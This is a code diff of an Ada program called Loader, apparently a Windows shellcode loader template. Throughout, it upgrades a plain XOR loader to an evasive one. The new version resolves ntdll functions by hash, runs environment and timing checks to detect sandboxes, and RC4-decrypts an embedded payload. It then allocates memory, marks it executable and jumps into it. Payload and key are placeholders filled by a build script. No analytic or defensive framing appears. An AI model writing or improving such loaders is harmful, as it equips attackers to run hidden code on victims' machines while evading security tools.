@@ -6,94 +6,157 @@ with System.Storage_Elements;
 
 procedure Loader is
    package C renames Interfaces.C;
-   use type C.size_t;
+   use type C.unsigned;
    use type C.int;
+   use type C.long;
+   use type C.size_t;
+   use type System.Address;
 
-   type HANDLE is new C.size_t;
-   type DWORD is new C.unsigned_long;
-   type SIZE_T is new C.size_t;
-   type LPVOID is new System.Address;
+   subtype U8 is Interfaces.Unsigned_8;
+   type Buf_T is array (Positive range <>) of U8;
+   type State_T is array (0 .. 255) of U8;
 
-   function VirtualAlloc(lpAddress: LPVOID; dwSize: SIZE_T; 
-      flAllocationType: DWORD; flProtect: DWORD) return LPVOID;
-   pragma Import(Stdcall, VirtualAlloc, "VirtualAlloc");
+   function Get_Fn (MH : C.unsigned; FH : C.unsigned) return System.Address;
+   pragma Import (C, Get_Fn, "resolve_api");
 
-   function VirtualProtect(lpAddress: LPVOID; dwSize: SIZE_T;
-      flNewProtect: DWORD; lpflOldProtect: access DWORD) return C.int;
-   pragma Import(Stdcall, VirtualProtect, "VirtualProtect");
+   function Check_Env (KH, H1, H2, H3 : C.unsigned) return C.int;
+   pragma Import (C, Check_Env, "env_check");
 
-   function CreateThread(lpThreadAttributes: LPVOID; dwStackSize: SIZE_T;
-      lpStartAddress: LPVOID; lpParameter: LPVOID; dwCreationFlags: DWORD;
-      lpThreadId: access DWORD) return HANDLE;
-   pragma Import(Stdcall, CreateThread, "CreateThread");
+   function Check_Time (KH, HT, HS : C.unsigned; MS : C.unsigned) return C.int;
+   pragma Import (C, Check_Time, "time_gate");
 
-   function WaitForSingleObject(hHandle: HANDLE; dwMilliseconds: DWORD) return DWORD;
-   pragma Import(Stdcall, WaitForSingleObject, "WaitForSingleObject");
+   --  Module identifiers
+   MH_N : constant C.unsigned := 16#NTDLL_HASH#;
+   MH_K : constant C.unsigned := 16#KERNEL32_HASH#;
 
-   procedure Sleep(dwMilliseconds: DWORD);
-   pragma Import(Stdcall, Sleep, "Sleep");
+   --  Function identifiers
+   FH_AV : constant C.unsigned := 16#NTALLOC_HASH#;
+   FH_PV : constant C.unsigned := 16#NTPROTECT_HASH#;
+   FH_SI : constant C.unsigned := 16#GSI_HASH#;
+   FH_MS : constant C.unsigned := 16#GMS_HASH#;
+   FH_TC : constant C.unsigned := 16#GTC_HASH#;
+   FH_SL : constant C.unsigned := 16#SLP_HASH#;
 
-   type Byte is new Interfaces.Unsigned_8;
-   type Byte_Array is array (Positive range <>) of Byte;
+   --  Memory management function types
+   type Alloc_Fn is access function
+     (PH   : System.Address;
+      BA   : access System.Address;
+      ZB   : C.size_t;
+      RS   : access C.size_t;
+      FL   : C.unsigned_long;
+      PR   : C.unsigned_long) return C.long;
+   pragma Convention (Stdcall, Alloc_Fn);
 
-   function To_Address is new Ada.Unchecked_Conversion(LPVOID, System.Address);
-   function To_LPVOID is new Ada.Unchecked_Conversion(System.Address, LPVOID);
+   type Protect_Fn is access function
+     (PH   : System.Address;
+      BA   : access System.Address;
+      RS   : access C.size_t;
+      NP   : C.unsigned_long;
+      OP   : access C.unsigned_long) return C.long;
+   pragma Convention (Stdcall, Protect_Fn);
 
-   procedure Decode(Buf: in out Byte_Array; Key: Interfaces.Unsigned_8) is
+   type Run_Fn is access procedure;
+   pragma Convention (Stdcall, Run_Fn);
+
+   function To_Alloc is new Ada.Unchecked_Conversion (System.Address, Alloc_Fn);
+   function To_Protect is new Ada.Unchecked_Conversion (System.Address, Protect_Fn);
+   function To_Run is new Ada.Unchecked_Conversion (System.Address, Run_Fn);
+
+   type Byte_Ptr is access all U8;
+   function To_Ptr is new Ada.Unchecked_Conversion (System.Address, Byte_Ptr);
+
+   procedure Transform (S : in out State_T; K : Buf_T) is
+      J   : Integer := 0;
+      Tmp : U8;
+   begin
+      for I in S'Range loop
+         S (I) := U8 (I);
+      end loop;
+      for I in S'Range loop
+         J := (J + Integer (S (I)) +
+               Integer (K ((I mod K'Length) + K'First))) mod 256;
+         Tmp := S (I); S (I) := S (J); S (J) := Tmp;
+      end loop;
+   end Transform;
+
+   procedure Apply (S : in out State_T; D : in out Buf_T) is
+      II  : Integer := 0;
+      JJ  : Integer := 0;
+      Tmp : U8;
+      KK  : U8;
       use Interfaces;
    begin
-      for I in Buf'Range loop
-         Buf(I) := Buf(I) xor 
-            Byte((Key + Unsigned_8((I - Buf'First) mod 256)) and 16#FF#);
+      for Pos in D'Range loop
+         II := (II + 1) mod 256;
+         JJ := (JJ + Integer (S (II))) mod 256;
+         Tmp := S (II); S (II) := S (JJ); S (JJ) := Tmp;
+         KK := S ((Integer (S (II)) + Integer (S (JJ))) mod 256);
+         D (Pos) := D (Pos) xor KK;
       end loop;
-   end Decode;
+   end Apply;
 
-   Payload: Byte_Array := (
-      -- PLACEHOLDER: Will be replaced by build script
-      16#90#, 16#90#
+   CP : constant System.Address :=
+     System.Storage_Elements.To_Address
+       (System.Storage_Elements.Integer_Address'Last);
+
+   Data : Buf_T := (
+###DATA###
    );
 
-   XOR_Key: constant Interfaces.Unsigned_8 := 0;
-   Mem: LPVOID;
-   Old_Protect: aliased DWORD;
-   Thread_Handle: HANDLE;
-   Thread_Id: aliased DWORD;
+   Key : constant Buf_T := (
+###KEY###
+   );
+
+   P_Alloc   : Alloc_Fn;
+   P_Protect : Protect_Fn;
+   Base      : aliased System.Address := System.Null_Address;
+   Region    : aliased C.size_t := C.size_t (Data'Length);
+   Old_P     : aliased C.unsigned_long;
+   Status    : C.long;
+   St        : State_T;
 
 begin
-   Sleep(1000);
-   Decode(Payload, XOR_Key);
+   if Check_Env (MH_K, FH_SI, FH_MS, FH_TC) = 0 then
+      return;
+   end if;
 
-   Mem := VirtualAlloc(To_LPVOID(System.Null_Address), SIZE_T(Payload'Length),
-                       16#3000#, 16#04#);
+   if Check_Time (MH_K, FH_TC, FH_SL, ###DELAY###) = 0 then
+      return;
+   end if;
 
-   if Mem = To_LPVOID(System.Null_Address) then
+   P_Alloc := To_Alloc (Get_Fn (MH_N, FH_AV));
+   P_Protect := To_Protect (Get_Fn (MH_N, FH_PV));
+
+   if P_Alloc = null or P_Protect = null then
+      return;
+   end if;
+
+   Transform (St, Key);
+   Apply (St, Data);
+
+   Status := P_Alloc.all (CP, Base'Access, 0, Region'Access,
+                           16#3000#, 16#04#);
+   if Status < 0 then
       return;
    end if;
 
    declare
-      Dest: System.Address := To_Address(Mem);
+      Dst : System.Address := Base;
       use System.Storage_Elements;
-      type Byte_Ptr is access all Byte;
-      function To_Ptr is new Ada.Unchecked_Conversion(System.Address, Byte_Ptr);
    begin
-      for I in Payload'Range loop
-         To_Ptr(Dest).all := Payload(I);
-         Dest := Dest + 1;
+      for I in Data'Range loop
+         To_Ptr (Dst).all := Data (I);
+         Dst := Dst + 1;
       end loop;
    end;
 
-   if VirtualProtect(Mem, SIZE_T(Payload'Length), 16#20#, Old_Protect'Access) = 0 then
+   Region := C.size_t (Data'Length);
+   Status := P_Protect.all (CP, Base'Access, Region'Access,
+                             16#20#, Old_P'Access);
+   if Status < 0 then
       return;
    end if;
 
-   Thread_Handle := CreateThread(To_LPVOID(System.Null_Address), 0, Mem, 
-                          To_LPVOID(System.Null_Address), 0, Thread_Id'Access);
+   To_Run (Base).all;
 
-   if Thread_Handle /= 0 then
-      declare
-         Result: constant DWORD := WaitForSingleObject(Thread_Handle, 16#FFFFFFFF#);
-      begin
-         null;
-      end;
-   end if;
 end Loader;
